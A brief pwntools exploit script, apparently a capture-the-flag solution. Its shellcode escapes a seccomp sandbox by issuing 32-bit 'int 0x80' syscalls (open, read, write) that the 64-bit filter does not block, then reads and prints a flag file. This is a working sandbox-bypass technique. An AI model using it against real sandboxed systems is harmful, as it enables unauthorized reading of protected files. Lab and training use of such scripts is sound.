from pwn import *
import pwn

pwn.context.arch = "amd64"
pwn.context.encoding = "latin"

# syscalls (32 bit mode)
# 3 - close
# 4 - stat
# 5 - fstat
# 6 - lstat
with pwn.process(["/challenge/babyjail_level9", "/"]) as target:
    pwn.info(target.readrepeat(1))

    target.send(pwn.asm(f"""

    //open
    xor ecx, ecx
    lea ebx, [rip+flag]
    mov eax, 5
    int 0x80

    //read
    xor ecx, ecx
    xor edx, edx
    mov ebx, eax
    mov ecx, esp
    mov edx, 100
    mov eax, 3
    int 0x80

    //write
    mov ebx, 1
    mov ecx, esp
    mov edx, eax
    mov eax, 4
    int 0x80

    //close
    mov ebx, eax 
    mov eax, 6
    int 0x80


flag:
    .ascii "flag"

    """))

    pwn.info(target.readrepeat(1))


    #print to file
    #with open("target.bin", "wb") as f:
    #    f.write(target)
    #exit(1)

